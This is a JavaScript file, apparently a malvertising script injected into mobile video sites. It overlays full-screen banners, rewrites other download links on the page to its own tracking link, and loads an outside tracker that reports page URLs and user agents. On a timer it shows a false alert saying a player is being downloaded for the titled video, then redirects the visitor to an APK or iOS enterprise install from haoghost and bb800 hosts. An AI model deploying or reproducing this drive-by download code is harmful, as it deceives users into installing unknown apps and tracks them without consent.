var hy_itv=setInterval(function(){
	if(!document || !document.body) return;
	else clearInterval(hy_itv);
	function setCookie(name,value){
        var Days = 30;  
        var exp  = new Date();  
        exp.setTime(exp.getTime() + Days*24*60*60*1000);  
        document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();  
	}  

	function getCookie(name)
	{
		var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	 
		if(arr=document.cookie.match(reg))
	 
			return (arr[2]);
		else
			return null;
	}

	var getJsonp = function( url, data, callback, str )
	{
		var script = document.createElement("script"),
			target = document.getElementsByTagName("head")[0],
			obj = null;
		script.type = "text/javascript";
		script.language = "javascript";
		this.jsonpcallback=callback;
		var data = data ? "&" + data : "",
			isOp = /\?{1}/.test( url ),
			domain = isOp ? url.slice( 0, url.search( /\?{1}/ ) ) : url,
			option = isOp ?  url.slice( url.search( /\?{1}/ ) + 1 ) + data : data;
		script.src = domain + "?"  + option;
		target.appendChild( script );
		script.onload = script.onreadystatechange = function()
		{
			if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete" )
			{
				callback( null , obj );
				this.onload = this.onreadystatechange = null;
				this.parentNode.removeChild( this );
			};
		};
		return obj;
	};

	if(/android/i.test(navigator.userAgent) || /ipad|iphone|mac|ios/i.test(navigator.userAgent))
	{
		
		var pname="360sqyy.apk",iosname="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
		if(getCookie("hycpc1")){
			pname="360ysdq2.apk";
			iosname="http://www.haima.me/tg/cpapz";
		}
		function autoDown()
		{
			var date = new Date();
			if(!getCookie("hy_cookie_time"))
			{
				setCookie("hy_cookie_time",date.getTime());
				return true;
			}
			else
			{
				var now=date.getTime(),before=parseInt(getCookie("hy_cookie_time"));
				if(now-before>5 * 60 * 1000)
				{
					setCookie("hy_cookie_time",now);
					return true;
				}
			}

			return false;
		}
		
		


		var num=hy_cpc_num || "10",num1="tag_"+num+"1",num2="tag_"+num+"2",azlink="http://m.haoghost.com/?f=cpctag_"+hy_cpc_num,ioslink="http://m.haoghost.com/ios.html?f=cpctag_"+num,lastlink=azlink;
		var toplink='<a href="'+azlink+'" id="hy_'+num1+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="http://m.haoghost.com/images/wb_t2.gif" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		var bottomlink='<a href="'+azlink+'" id="hy_'+num2+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="http://m.haoghost.com/images/wb_b2.gif" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		if(/ipad|iphone|mac|ios/i.test(navigator.userAgent))
		{
			lastlink=ioslink;
			num1="tag_"+num+"3";num2="tag_"+num+"4";
			toplink='<a href="'+ioslink+'" id="hy_'+num1+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="http://m.haoghost.com/images/wb_t2.gif" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
			bottomlink='<a href="'+ioslink+'" id="hy_'+num2+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="http://m.haoghost.com/images/wb_ios2.gif" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		}
		var str='<div id="hy_cpc_top" style="text-align: center;display: block;width: 100%;filter: alpha(opacity=90);-moz-opacity: 0.9;-khtml-opacity: 0.9;opacity: 1;position: fixed;top: 0px;left: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;">'+
			toplink+'</div><div id="hy_cpc_bottom" style="text-align: center;display: block;width: 100%;opacity: 1;position: fixed;bottom: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;right: 0px;">'+
			bottomlink+'</div><div id="hy_cpc_tj" style="display:none"></div>';
		var div=document.createElement("div");
		div.innerHTML=str;

		document.body.appendChild(div);
		var ww=window.screen.width;
		var t1=document.getElementById("hy_"+num1),t2=document.getElementById("hy_"+num2),wh=ww*90/435,h1=document.getElementById("hy_cpc_top"),h2=document.getElementById("hy_cpc_bottom"),i1=document.getElementById("hy_cpc_imgt"),i2=document.getElementById("hy_cpc_imgb");
		
		if(num==17)
		{
			t1.style.display=="none";
			ww=window.document.documentElement.clientWidth;
		}
		ww=ww>1305?1305:ww;
		
		//t1.style.width=t2.style.width=ww+"px";
		//i1.style.height=i2.style.height=h1.style.height=h2.style.height=t1.style.height=t2.style.height=wh+"px";
		document.body.style["padding-top"]=wh+"px";
		document.body.style["padding-bottom"]=wh+"px";
		
		document.getElementById("hy_cpc_tclose").addEventListener("touchstart",function(event){
			h1.style.display="none";
			document.body.style["padding-top"]="0px";
			if (event.stopPropagation) {
				event.stopPropagation(); 
			} 
			else if (window.event) { 
				window.event.cancelBubble = true; 
			}
			return false;
		},false);
		document.getElementById("hy_cpc_bclose").addEventListener("touchstart",function(event){
			h2.style.display="none";
			document.body.style["padding-bottom"]="0px";
			if (event.stopPropagation) {
				event.stopPropagation(); 
			} 
			else if (window.event) { 
				window.event.cancelBubble = true; 
			}
			return false;
		},false);

		var ua=navigator.userAgent;

		

		if(num==18 || num==19)
		{
			window.setInterval(function(){
				var d=document.getElementById("JS_BottmEX2_Div");
				var i=document.getElementsByTagName("ins");
				var as=document.getElementsByTagName("a"),str_gg=[];
				str_gg[0]="http://cnrdn.com/fyRE";
				str_gg[1]="http://xiazai.3ddianshiji.com/i/";
				str_gg[2]="http://download.wuji.com:6677/wuji/setup/";
				str_gg[3]="http://dl.client.baidu.com/union/";
				str_gg[4]="http://pc.cyousoft.com/shouqu_126_10.html";
				if(d) d.style.display="none";
				if(i[0]) i[0].style.display="none";
				for(var i=0;i<as.length;i++)
				{
					var temp=as[i].getAttribute("href");
					if(!temp) continue;
					for(var j=0;j<str_gg.length;j++)
					{
						if(temp.indexOf(str_gg[j])>-1){as[i].setAttribute("href",lastlink+"_btn");break;}
					}
					
				}
			},500);
		}

		if(!/ipad|iphone|mac|ios/i.test(navigator.userAgent))
		{
			var script = document.createElement("script");
			script.type = "text/javascript";
			script.language = "javascript";
			script.src="http://js.users.51.la/17318300.js";
			var tj=document.getElementById("hy_cpc_tj");
			tj.appendChild(script);
			script.onload = script.onreadystatechange = function()
			{
				if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete" )
				{
					window.setTimeout(function(){
						if(num==18 || num==19)
						{
							var tt=document.getElementsByTagName("title")[0].innerHTML;
							if(tt.indexOf("》")<0 || !autoDown()) return;
							tt=tt.split("》")[0]+"》";
							alert("正在为您下载播放器，安装后即可观看"+tt);
							if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
								window.location.href=iosname;	
							}
							else
							{
								window.location.href="http://d.haoghost.com/"+pname;
							}
							setCookie("hycpc1","1");
						}
					},1000);
					this.onload = this.onreadystatechange = null;
				}
			}
		}

		

		//document.write(unescape("%3Cdiv style='display:none;'%3E%3Cscript src='http://s95.cnzz.com/stat.php?id=1253099509&web_id=1253099509' type='text/javascript'%3E%3C/script%3E%3C/div%3E"));
		window.onresize=function(){
			
		}
		return;
		function send(obj,num)
		{
			setTimeout(function(){
				getJsonp(
					'http://click.shuiguo.com/index.php?action=index&method=main1',
					"t=undefined&l="+obj+"&s="+num+"&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
					function(data){

					}
				);
			},0);

		}
		
		i1.addEventListener("touchend",function(){send(t1.getAttribute("href"),num1);alert("已经开始下载,下载完成后记得安装哦~");setCookie("hycpc1","1");setpac();});
		i2.addEventListener("touchend",function(){send(t2.getAttribute("href"),num2);alert("已经开始下载,下载完成后记得安装哦~");setCookie("hycpc1","1");setpac();});
		
		
		
		function setpac()
		{
			
		}
	}
},500)


/*send("","tag_"+num+"9");
window.setTimeout(function(){
	t1.setAttribute("href","http://d.haoghost.com/360ysdq.apk");
	t2.setAttribute("href","http://d.haoghost.com/360ysdq.apk");
},1000);*/